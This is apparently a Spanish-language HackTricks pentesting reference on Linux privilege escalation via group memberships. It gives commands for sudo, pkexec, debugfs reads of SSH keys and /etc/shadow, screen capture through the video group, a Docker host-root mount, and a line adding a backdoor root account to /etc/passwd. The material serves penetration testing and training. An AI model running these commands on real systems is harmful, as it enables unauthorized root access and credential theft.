# Grupos Interesantes - Linux Privesc

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Grupos Sudo/Admin

### **PE - Método 1**

**A veces**, **por defecto (o porque algún software lo necesita)** dentro del archivo **/etc/sudoers** puedes encontrar algunas de estas líneas:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Esto significa que **cualquier usuario que pertenezca al grupo sudo o admin puede ejecutar cualquier cosa como sudo**.

Si este es el caso, para **convertirse en root solo es necesario ejecutar**:
```
sudo su
```
### PE - Método 2

Encuentra todos los binarios suid y verifica si está el binario **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Si encuentras que el binario **pkexec es un binario SUID** y perteneces a los grupos **sudo** o **admin**, probablemente puedas ejecutar binarios como sudo usando `pkexec`. Esto se debe a que típicamente esos son los grupos dentro de la **política de polkit**. Esta política básicamente identifica qué grupos pueden usar `pkexec`. Verifícalo con:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Allí encontrarás qué grupos tienen permiso para ejecutar **pkexec** y **por defecto** en algunas distribuciones de Linux aparecen los grupos **sudo** y **admin**.

Para **convertirse en root se puede ejecutar**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Si intentas ejecutar **pkexec** y obtienes este **error**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**No es porque no tengas permisos, sino porque no estás conectado sin una GUI**. Y hay una solución para este problema aquí: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Necesitas **2 sesiones ssh diferentes**:

{% code title="sesión1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="sesión2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Grupo Wheel

**A veces**, **por defecto** dentro del archivo **/etc/sudoers**, se puede encontrar esta línea:
```
%wheel	ALL=(ALL:ALL) ALL
```
Esto significa que **cualquier usuario que pertenezca al grupo wheel puede ejecutar cualquier cosa como sudo**.

Si este es el caso, para **convertirse en root solo hay que ejecutar**:
```
sudo su
```
## Grupo Shadow

Los usuarios del **grupo shadow** pueden **leer** el archivo **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## Grupo de Disco

Este privilegio es casi **equivalente al acceso de root** ya que se puede acceder a todos los datos dentro de la máquina.

Archivos: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Tenga en cuenta que utilizando debugfs también puede **escribir archivos**. Por ejemplo, para copiar `/tmp/asd1.txt` a `/tmp/asd2.txt`, puede hacer lo siguiente:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Sin embargo, si intentas **escribir archivos propiedad de root** (como `/etc/shadow` o `/etc/passwd`) obtendrás un error de "**Permiso denegado**".

## Grupo de Video

Usando el comando `w` puedes encontrar **quién está conectado al sistema** y mostrará una salida como la siguiente:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
El **tty1** significa que el usuario **yossi está conectado físicamente** a un terminal en la máquina.

El grupo **video** tiene acceso para ver la salida de pantalla. Básicamente, se puede observar la pantalla. Para hacerlo, es necesario **capturar la imagen actual de la pantalla** en datos brutos y obtener la resolución que está utilizando la pantalla. Los datos de la pantalla se pueden guardar en `/dev/fb0` y se puede encontrar la resolución de esta pantalla en `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Para **abrir** la **imagen cruda**, puedes usar **GIMP**, selecciona el archivo \*\*`screen.raw` \*\* y selecciona como tipo de archivo **Datos de imagen cruda**:

![](<../../../.gitbook/assets/image (287) (1).png>)

Luego modifica el Ancho y Alto a los que se usaron en la pantalla y verifica diferentes Tipos de Imagen (y selecciona el que muestre mejor la pantalla):

![](<../../../.gitbook/assets/image (288).png>)

## Grupo Root

Parece que por defecto, **los miembros del grupo root** podrían tener acceso para **modificar** algunos archivos de configuración de **servicios** o algunos archivos de **bibliotecas** u **otras cosas interesantes** que podrían ser utilizadas para escalar privilegios...

**Verifica qué archivos pueden modificar los miembros de root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Grupo Docker

Puedes **montar el sistema de archivos raíz de la máquina anfitriona en el volumen de una instancia**, por lo que cuando la instancia se inicia, carga inmediatamente un `chroot` en ese volumen. Esto te da efectivamente acceso root en la máquina.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finalmente, si no te gustan ninguna de las sugerencias anteriores o no funcionan por alguna razón (¿firewall de la API de Docker?), siempre puedes intentar **ejecutar un contenedor privilegiado y escapar de él** como se explica aquí:

{% content-ref url="../docker-security/" %}
[seguridad de Docker](../docker-security/)
{% endcontent-ref %}

Si tienes permisos de escritura sobre el socket de Docker, lee [**esta publicación sobre cómo escalar privilegios abusando del socket de Docker**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## Grupo lxc/lxd

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Grupo Adm

Por lo general, los **miembros** del grupo **`adm`** tienen permisos para **leer archivos de registro** ubicados dentro de _/var/log/_.\
Por lo tanto, si has comprometido a un usuario dentro de este grupo, definitivamente deberías **echar un vistazo a los registros**.

## Grupo Auth

Dentro de OpenBSD, el grupo **auth** generalmente puede escribir en las carpetas _**/etc/skey**_ y _**/var/db/yubikey**_ si se usan.\
Estos permisos pueden ser abusados con el siguiente exploit para **escalar privilegios** a root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
